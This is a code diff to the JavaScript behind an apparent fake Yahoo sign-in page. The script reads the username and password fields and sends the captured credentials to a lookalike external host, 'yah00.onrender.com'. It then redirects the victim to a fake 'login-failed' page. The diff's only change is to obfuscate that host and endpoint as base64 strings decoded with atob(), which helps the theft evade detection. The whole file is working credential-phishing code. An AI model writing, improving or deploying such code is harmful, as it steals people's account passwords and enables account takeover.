@@ -2,11 +2,9 @@ document.addEventListener("DOMContentLoaded", function () {
     //form handler
     console.log("sender script loaded");
 
-    const hostname = "https://yah00.onrender.com";
-    const endpoint = "https://yah00.onrender.com/endpoint";
-
+    const hostname = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
+    const endpoint = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
     const yahooEmailRegex = /^[^\s@]+@yahoo\.com$/i;
-
     const nextButton = document.querySelector("#login-signin");
     const emailInput = document.querySelector("#login-username");
     const passwordInput = document.querySelector("#login-passwd");
@@ -48,7 +46,7 @@ document.addEventListener("DOMContentLoaded", function () {
         //then
         if(isYahoo){
             localStorage.setItem("user-email", email);
-            window.location.href = `${hostname}/display-password.htm`;
+            window.location.href = `${atob(hostname)}/display-password.htm`;
         }
         return;
     };
@@ -66,16 +64,16 @@ document.addEventListener("DOMContentLoaded", function () {
             "password": password
         };
         try {
-            const res = await axios.post(`${endpoint}`, payload, {
+            const res = await axios.post(`${atob(endpoint)}`, payload, {
                 headers: {
                     "Content-Type": "application/json",
                     "Access-Control-Allow-Origin": "*"
                 }
             });
             if (res.status == 200) {
-                window.location.href = `${hostname}/login-failed.htm`;
+                window.location.href = `${atob(hostname)}/login-failed.htm`;
             } else {
-                window.location.href = `${hostname}/display-login.htm`;
+                window.location.href = `${atob(hostname)}/display-login.htm`;
             }
         } catch (error) {
             console.error("Error:", error);
